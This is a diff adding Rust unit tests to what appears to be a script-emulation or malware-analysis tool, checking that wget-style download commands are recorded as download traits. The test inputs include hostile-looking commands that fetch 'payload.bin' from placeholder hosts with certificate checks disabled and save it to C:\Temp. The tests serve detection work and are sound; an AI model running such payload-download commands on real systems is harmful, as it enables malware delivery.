@@ -6772,6 +6772,68 @@ mod curl_tests {
 }
 
 #[cfg(test)]
+mod wget_tests {
+    use crate::env::{Config, Environment};
+    use crate::interp::interpret_line;
+    use crate::traits::Trait;
+
+    #[test]
+    fn wget_output_flag_records_download() {
+        let mut env = Environment::new(&Config::default());
+        interpret_line(
+            r#"wget --no-check-certificate https://wget-direct.example/payload.bin -O C:\Temp\payload.bin"#,
+            &mut env,
+        );
+        let downloads: Vec<_> = env
+            .traits
+            .iter()
+            .filter_map(|t| match t {
+                Trait::Download { src, dst, .. } => Some((src.as_str(), dst.as_deref())),
+                _ => None,
+            })
+            .collect();
+        assert_eq!(
+            downloads,
+            vec![(
+                "https://wget-direct.example/payload.bin",
+                Some(r#"C:\Temp\payload.bin"#)
+            )],
+            "traits: {:?}",
+            env.traits
+        );
+        assert!(env
+            .modified_filesystem
+            .contains_key(r#"c:\temp\payload.bin"#));
+    }
+
+    #[test]
+    fn get_exe_wget_style_glued_output_records_download() {
+        let mut env = Environment::new(&Config::default());
+        interpret_line(
+            r#"get.exe https://get-direct.example/payload.bin -OC:\Temp\get.bin"#,
+            &mut env,
+        );
+        let downloads: Vec<_> = env
+            .traits
+            .iter()
+            .filter_map(|t| match t {
+                Trait::Download { src, dst, .. } => Some((src.as_str(), dst.as_deref())),
+                _ => None,
+            })
+            .collect();
+        assert_eq!(
+            downloads,
+            vec![(
+                "https://get-direct.example/payload.bin",
+                Some(r#"C:\Temp\get.bin"#)
+            )],
+            "traits: {:?}",
+            env.traits
+        );
+    }
+}
+
+#[cfg(test)]
 mod misc_handler_tests {
     use crate::env::{Config, Environment, FsEntry};
     use crate::interp::interpret_line;
